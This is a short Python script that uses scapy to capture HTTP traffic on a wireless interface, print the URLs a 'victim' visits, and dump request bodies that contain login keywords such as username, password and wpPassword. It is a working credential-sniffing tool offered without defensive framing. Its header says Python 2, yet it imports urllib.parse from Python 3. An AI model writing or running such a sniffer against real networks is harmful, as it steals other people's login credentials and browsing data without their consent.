# Only HTTP
# Python2

from scapy import all as scapy # packet capture module
from scapy.layers import http # supplementing scapy module by providing http filter
from urllib.parse import unquote # to make url encoded text into string
 
 
# keywords guessing the variable use for username and password
keywords = ['username', 'user', 'login', 'mail', 'email', 'usuario', 'clave', 'password', 'pass', 'wpName', 'wpPassword']
 
 
class sniffing():
    def __init__(self, interface, filter=""):
        self.sniffs(interface, filter)
 
    def processing_data(self, pkt):
        if pkt.haslayer(http.HTTPRequest): # look for http request
            print(pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path) # print the URL, the victim visits
            if pkt.haslayer(scapy.Raw): # username and password appears in raw field
                for keyword in keywords: # check if each keyword exists
                    if keyword in str(pkt[scapy.Raw]): # in the raw field
                        print(unquote(str(pkt[scapy.Raw]))) # if exists, print out the content once.
                        break
 
    def sniffs(self, interface, filter):
        return scapy.sniff(iface=interface, store=False, prn=self.processing_data, filter=filter)

test = sniffing(interface='wlan0')